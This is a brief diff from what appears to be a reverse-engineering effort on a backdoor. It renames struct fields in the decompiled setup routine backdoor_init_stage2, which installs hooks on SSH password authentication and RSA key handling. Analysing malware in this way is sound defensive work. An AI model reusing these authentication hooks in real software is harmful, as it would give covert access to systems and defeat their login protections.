@@ -48,11 +48,11 @@ BOOL backdoor_init_stage2
   }
   setup_params_ptr = &local_a0;
   for (clear_idx = 0x22; clear_idx != 0; clear_idx = clear_idx + -1) {
-    setup_params_ptr->_unknown1649[0] = '\0';
-    setup_params_ptr->_unknown1649[1] = '\0';
-    setup_params_ptr->_unknown1649[2] = '\0';
-    setup_params_ptr->_unknown1649[3] = '\0';
-    setup_params_ptr = (backdoor_setup_params_t *)(setup_params_ptr->_unknown1649 + 4);
+    setup_params_ptr->bootstrap_padding[0] = '\0';
+    setup_params_ptr->bootstrap_padding[1] = '\0';
+    setup_params_ptr->bootstrap_padding[2] = '\0';
+    setup_params_ptr->bootstrap_padding[3] = '\0';
+    setup_params_ptr = (backdoor_setup_params_t *)(setup_params_ptr->bootstrap_padding + 4);
   }
   local_140.authpassword_hook_entry = mm_answer_authpassword_hook;
   local_140.evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
@@ -63,7 +63,7 @@ BOOL backdoor_init_stage2
   hooks_ctx_ptr = extraout_RDX;
   do {
     if (status == 0) {
-      local_a0.shared = shared_globals_ptr;
+      local_a0.shared_globals = shared_globals_ptr;
       local_a0.entry_ctx = ctx;
       setup_success = backdoor_setup(&local_a0);
       return setup_success;
